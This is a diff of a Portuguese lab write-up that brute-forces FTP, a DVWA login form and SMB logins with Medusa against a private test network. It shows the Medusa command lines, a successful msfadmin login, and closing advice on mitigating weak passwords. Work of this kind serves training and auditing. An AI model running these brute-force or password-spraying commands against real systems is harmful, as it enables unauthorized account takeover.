@@ -11,8 +11,10 @@
 
 ## Força bruta em FTP: 
 
-```
-                                                                                                                                                                                                                                         
+
+Acesso negado no FTP:
+
+```                                                                                                                                                                                                                                       
 ┌──(kali㉿kali)-[~]
 └─$ ftp 192.168.56.102
 Connected to 192.168.56.102.
@@ -25,7 +27,6 @@ ftp: Login failed
 ftp> 
 ```
  
-
 
 Criando wordlists e uma lista de senhas:
 
@@ -60,7 +61,7 @@ root
 ``` 
 
 
-Comando
+Linha de comando:
 
 ``` medusa -h 192.168.56.102 -U user.txt -P pass.txt -M ftp -t 6 ```
 
@@ -91,25 +92,30 @@ Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.n
 Validação do acesso FTP com login e senha encontraodo com "SUCCESS"
 
                                                                                                                                                                          ```                                                                 
-┌──(kali㉿kali)-[~]
-└─$ ftp 192.168.56.102
-Connected to 192.168.56.102.
-220 (vsFTPd 2.3.4)
-Name (192.168.56.102:kali): msfadmin    
-331 Please specify the password.
-Password: 
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
+┌──(kali@kali)-[~]\
+└─$ ftp 192.168.56.102\
+Connected to 192.168.56.102.\
+220 (vsFTPd 2.3.4)\
+Name (192.168.56.102:kali): msfadmin\ 
+331 Please specify the password.\
+Password: \
+230 Login successful.\
+Remote system type is UNIX.\
+Using binary mode to transfer files.\
 ftp> 
 ```
 
 ## Automação de tentativas em formulário web (DVWA) 
 
+Site do DVWA:
 https://192.168.56.10/dvwa/login.php
+
+Inspeção da página:
 
 <img width="1721" height="874" alt="Captura de tela de 2026-11-06 14-37-32" src="https://github.com/user-attachments/assets/1d54dda2-5135-40f0-b507-e4cc1819725d" />
 
+
+Linha de comando para teste acesso:
 
 ```
 medusa -h  192.168.56.102 -U users.txt -P pass.txt -M http \
@@ -196,6 +202,7 @@ O comando:
 medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smnt -t 2- T50
 ```
 
+Execução comando:
 
 ```                                                                                                                                                                                                                
 ┌──(kali㉿kali)-[~]
@@ -251,12 +258,9 @@ Reconnecting with SMB1 for workgroup listing.
 ┌──(kali㉿kali)-[~]
 └─$ 
 ```
+## Conclusão
 
-
-## Comandos utilizados
-
-
-## Validação de acessos 
+O uso de senhas fracas, conhecidas, deixam seus sistemas vulneráveis.
 
 
 ## Recomendações de mitigação
@@ -268,6 +272,5 @@ Reconnecting with SMB1 for workgroup listing.
 - Realizar auditorias regulares, usando ferramentas como medusa e outros métodos para fins de testes.
 
 
-## Resutados
 
 
